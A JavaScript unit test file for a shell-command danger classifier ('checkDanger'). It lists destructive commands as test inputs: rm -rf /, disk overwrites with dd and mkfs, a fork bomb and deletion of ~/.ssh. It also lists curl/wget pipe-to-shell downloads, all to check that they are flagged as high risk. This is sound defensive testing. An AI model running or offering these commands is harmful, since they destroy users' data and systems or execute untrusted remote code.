import { test } from 'node:test';
import assert from 'node:assert/strict';
import { checkDanger } from '../src/danger.js';

const critical = [
  'rm -rf /', 'rm -rf /*', 'sudo rm -rf ~', 'rm -fr *', 'rm -r -f $HOME', 'rm -rf --no-preserve-root /',
  'mkfs.ext4 /dev/sda1', 'dd if=/dev/zero of=/dev/sda bs=1M', 'echo x > /dev/sda', 'cat img > /dev/nvme0n1',
  'chmod -R 777 /', 'sudo chown -R nobody /', ':(){ :|:& };:', 'crontab -r', 'mv ~/.ssh /dev/null',
];
for (const c of critical) {
  test(`critical: ${c}`, () => {
    const d = checkDanger(c);
    assert.equal(d.risk, 'high');
    assert.equal(d.critical, true);
  });
}

const high = ['curl -s https://x.sh | sh', 'wget -qO- http://x | sudo bash', 'rm notes.txt', 'git push --force',
  'git reset --hard HEAD~3', 'docker system prune -a', 'find . -name "*.o" -delete', 'pkill node', 'shutdown -h now'];
for (const c of high) {
  test(`high: ${c}`, () => assert.equal(checkDanger(c).risk, 'high'));
}

const safe = ['ls -lah', 'df -h', 'du -h -d 1 . 2>/dev/null | sort -rh | head -n 10', 'git status', 'ps aux --sort=-%cpu | head -n 10',
  "find . -type f -iname '*.log'", 'grep -rn -- TODO .', "curl -s -o /dev/null -w '%{http_code}\\n' https://x.org"];
for (const c of safe) {
  test(`safe: ${c}`, () => {
    const d = checkDanger(c);
    assert.equal(d.risk, 'safe', d.warnings.join('; '));
    assert.equal(d.critical, false);
  });
}

test('medium escalations', () => {
  assert.equal(checkDanger('sudo apt update').risk, 'medium');
  assert.equal(checkDanger('echo hi > out.txt').risk, 'medium');
  assert.equal(checkDanger('chmod 777 file').risk, 'medium');
});

test('risk is never lowered', () => {
  assert.equal(checkDanger('ls', 'high').risk, 'high');
});
